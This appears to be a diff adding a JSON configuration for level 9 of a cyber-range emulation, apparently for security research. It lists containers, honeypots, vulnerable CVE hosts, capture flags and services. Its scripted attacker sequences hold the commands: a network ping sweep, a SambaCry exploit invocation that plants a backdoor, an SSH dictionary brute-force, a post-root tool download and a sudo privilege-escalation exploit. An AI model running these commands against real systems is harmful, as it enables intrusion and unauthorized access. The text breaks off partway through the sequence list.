+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_11",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_12-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.8.22",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.22",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_12",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_13-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.8.23",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.23",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_13",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_cve_2016_10033_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.8.24",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.24",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_cve_2016_10033_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_cve_2015_5602_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.8.25",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.25",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_cve_2015_5602_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    }
+  ],
+  "counts": {
+    "containers": 33,
+    "flags": 6,
+    "services": 33,
+    "static_attacker_sequences": {
+      "experienced": 17,
+      "expert": 17,
+      "novice": 15
+    },
+    "topology_nodes": 33,
+    "users": 28,
+    "vulnerabilities": 14
+  },
+  "execution_id_placeholder": "<EXECUTION_ID>",
+  "flags": [
+    {
+      "docker_gw_bridge_ip": "",
+      "flags": [
+        {
+          "dir": "/tmp/",
+          "id": 3,
+          "name": "flag3",
+          "path": "/tmp/flag3.txt",
+          "requires_root": true,
+          "score": 1
+        }
+      ],
+      "ip": "<EXECUTION_ID>.9.2.79",
+      "physical_host_ip": ""
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "flags": [
+        {
+          "dir": "/tmp/",
+          "id": 2,
+          "name": "flag2",
+          "path": "/tmp/flag2.txt",
+          "requires_root": true,
+          "score": 1
+        }
+      ],
+      "ip": "<EXECUTION_ID>.9.2.78",
+      "physical_host_ip": ""
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "flags": [
+        {
+          "dir": "/tmp/",
+          "id": 1,
+          "name": "flag1",
+          "path": "/tmp/flag1.txt",
+          "requires_root": true,
+          "score": 1
+        }
+      ],
+      "ip": "<EXECUTION_ID>.9.2.3",
+      "physical_host_ip": ""
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "flags": [
+        {
+          "dir": "/tmp/",
+          "id": 4,
+          "name": "flag4",
+          "path": "/tmp/flag4.txt",
+          "requires_root": true,
+          "score": 1
+        }
+      ],
+      "ip": "<EXECUTION_ID>.9.3.54",
+      "physical_host_ip": ""
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "flags": [
+        {
+          "dir": "/tmp/",
+          "id": 5,
+          "name": "flag5",
+          "path": "/tmp/flag5.txt",
+          "requires_root": true,
+          "score": 1
+        }
+      ],
+      "ip": "<EXECUTION_ID>.9.4.61",
+      "physical_host_ip": ""
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "flags": [
+        {
+          "dir": "/tmp/",
+          "id": 6,
+          "name": "flag6",
+          "path": "/tmp/flag6.txt",
+          "requires_root": true,
+          "score": 1
+        }
+      ],
+      "ip": "<EXECUTION_ID>.9.6.7",
+      "physical_host_ip": ""
+    }
+  ],
+  "level": 9,
+  "name": "csle-level9-0.10.0",
+  "network_id": 9,
+  "router_ip_template": "<EXECUTION_ID>.9.2.10",
+  "services": [
+    {
+      "ip": "<EXECUTION_ID>.9.1.254",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.79",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ftp",
+          "port": 21,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "mongo",
+          "port": 27017,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "teamspeak3",
+          "port": 30033,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "tomcat",
+          "port": 8080,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.1.191",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.21",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.10",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.78",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "dns",
+          "port": 53,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "http",
+          "port": 80,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.3",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "samba",
+          "port": 445,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "telnet",
+          "port": 23,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.6.7",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "samba",
+          "port": 445,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.5.101",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "irc",
+          "port": 194,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.3.54",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "http",
+          "port": 80,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.4.74",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "http",
+          "port": 80,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "irc",
+          "port": 194,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.4.61",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "teamspeak3",
+          "port": 30033,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "tomcat",
+          "port": 8080,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.5.62",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "elasticsearch",
+          "port": 9200,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.4",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.5",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.6",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.8",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.9",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.2.178",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "proftpd",
+          "port": 21,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.9.11",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.9.12",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.9.13",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.9.14",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.7.15",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.7.16",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.7.17",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.7.18",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.8.19",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.8.20",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.8.22",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.8.23",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "snmp",
+          "port": 161,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "smtp",
+          "port": 25,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "postgres",
+          "port": 5432,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "ntp",
+          "port": 123,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.8.24",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        },
+        {
+          "credentials": [],
+          "name": "http",
+          "port": 80,
+          "protocol": "TCP"
+        }
+      ]
+    },
+    {
+      "ip": "<EXECUTION_ID>.9.8.25",
+      "services": [
+        {
+          "credentials": [],
+          "name": "ssh",
+          "port": 22,
+          "protocol": "TCP"
+        }
+      ]
+    }
+  ],
+  "source": "csle-level9",
+  "source_config": "/home/yu3194924316/llm-recovery-dt/external/csle/emulation-system/envs/0.10.0/level_9/config.py",
+  "static_attacker_sequences": {
+    "experienced": [
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"
+        ],
+        "descr": "Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor to upgrade the channel",
+        "id": "SAMBACRY_EXPLOIT",
+        "index": 1,
+        "ips": [],
+        "name": "Sambacry Explolit",
+        "type": "EXPLOIT",
+        "vulnerability": "cve-2017-7494"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PIVOTING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo apt-get -y install nmap ssh git unzip lftp",
+          "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"
+        ],
+        "descr": "If taken root on remote machine, installs pentest tools, e.g. nmap",
+        "id": "INSTALL_TOOLS",
+        "index": -1,
+        "ips": [],
+        "name": "Install tools",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "INFORMATION_GATHERING",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -sP --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A host discovery scan, it is quick because it only checks of hosts are up with Ping, without scanning the ports.",
+        "id": "PING_SCAN_ALL",
+        "index": -1,
+        "ips": [
+          "<EXECUTION_ID>.9.1.0/24",
+          "<EXECUTION_ID>.9.2.0/24",
+          "<EXECUTION_ID>.9.3.0/24",
+          "<EXECUTION_ID>.9.4.0/24",
+          "<EXECUTION_ID>.9.5.0/24",
+          "<EXECUTION_ID>.9.6.0/24",
+          "<EXECUTION_ID>.9.7.0/24",
+          "<EXECUTION_ID>.9.8.0/24",
+          "<EXECUTION_ID>.9.9.0/24"
+        ],
+        "name": "Ping Scan",
+        "type": "RECON",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "SHELL_ACCESS",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [
+          "sudo nmap -p 22 --script ssh-brute --script-args userdb=/SecLists/Usernames/top-usernames-shortlist.txt,passdb=/SecLists/Usernames/top-usernames-shortlist.txt,ssh-brute.timeout=8s,brute.firstonly=true --min-rate 100000 --max-retries 1 -T5 -n "
+        ],
+        "descr": "A dictionary attack that tries common passwords and usernames for SSH where username=password",
+        "id": "SSH_SAME_USER_PASS_DICTIONARY_HOST",
+        "index": 11,
+        "ips": [],
+        "name": "SSH dictionary attack for username=pw",
+        "type": "EXPLOIT",
+        "vulnerability": "ssh-weak-password"
+      },
+      {
+        "action_outcome": "LOGIN",
+        "alt_cmds": [],
+        "backdoor": false,
+        "cmds": [],
+        "descr": "Uses known credentials to login to network services on a server",
+        "id": "NETWORK_SERVICE_LOGIN",
+        "index": -1,
+        "ips": [],
+        "name": "Network service login",
+        "type": "POST_EXPLOIT",
+        "vulnerability": null
+      },
+      {
+        "action_outcome": "PRIVILEGE_ESCALATION_ROOT",
+        "alt_cmds": [],
+        "backdoor": true,
+        "cmds": [
+          "/cve_2010_0426_exploit.sh {}",
+          "/create_backdoor_cve_2010_0426.sh"
+        ],
